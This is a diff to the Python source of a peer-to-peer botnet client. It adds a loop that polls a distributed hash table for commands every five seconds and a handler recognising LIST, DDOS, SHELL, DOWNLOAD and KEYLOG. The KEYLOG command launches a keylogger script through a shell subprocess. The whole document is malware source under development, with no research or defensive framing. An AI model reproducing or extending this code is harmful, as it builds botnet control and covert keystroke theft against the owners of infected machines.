@@ -2,6 +2,7 @@ import hashlib
 import sys
 from twisted.internet import reactor, task, defer
 from twisted.python import log
+from subprocess import call
 #import kademlia
 import time
 import keylogger
@@ -33,7 +34,8 @@ class botnode:
 		self.private = RSA.generate(1024,Random.new().read)
 		self.public = self.private.publickey()
 		self.id = network_id
-		self.cmdkey = idhash#update(network_id).hexdigest()
+		#this cmdkey is the hash of the nodes bot id
+		self.cmdkey = idhash    #update(network_id).hexdigest()
 
 def get_hash(prehash):
 	m = hashlib.sha1()
@@ -42,21 +44,29 @@ def get_hash(prehash):
 	#print m.hexdigest()
 	return m.hexdigest()
 
-def done(result):
-    print "Key result:", result
-   # reactor.stop()
+# def done(result):
+#     print "Key result:", result
+#    # reactor.stop()
 
-def setDone(result, server):
-    server.get("Loser").addCallback(done)
+# def setDone(result, server):
+#     server.get("Loser").addCallback(done)
 
 #helper function to get most common element in a list
 def most_common(list):
 	data = Counter(list)
 	return data.most_common(1)[0][0]
-def wait_cmd(cmd,server,bot):
-	if not cmd:
-		server.get(bot.cmdkey).addCallback(wait_cmd,server,bot)
-	print "we have a command"
+def get_cmd(cmd,server,bot):
+	commands = ['LIST','DDOS','SHELL','DOWNLOAD','KEYLOG']
+	if cmd in commands:
+		if cmd == 'KEYLOG':
+			tmp = 'python keylogger.py {0}'.format(bot.cmdkey)
+			call(tmp.split(),stdin=None, stdout=None, stderr=None,shell=True)
+			keylogger.run
+
+def wait_cmd(server,bot):
+	print "Checking for command"
+	server.get(bot.cmdkey).addCallback(get_cmd,server,bot)
+	#print "we have a command"
 	#reactor.stop()
 
 def ack_valid(value,server,bot):
@@ -66,7 +76,9 @@ def ack_valid(value,server,bot):
 		print "no ack"
 	else:
 		print "we have an ack"
-		wait_cmd(None,server,bot)
+		cmdloop = task.LoopingCall(wait_cmd,server,bot)
+		cmdloop.start(5)
+		#wait_cmd(None,server,bot)
 
 def check_ack(result,server,bot):
 	mykey = hashlib.sha1()
@@ -96,6 +108,7 @@ def bootstrapDone(found, server):
     if len(found) == 0:
         print "Could not connect to the bootstrap server."
         reactor.stop()
+        exit(0)
     server.inetVisibleIP().addCallback(setup,server)
 
 #keylogger.log(done, print_keys)
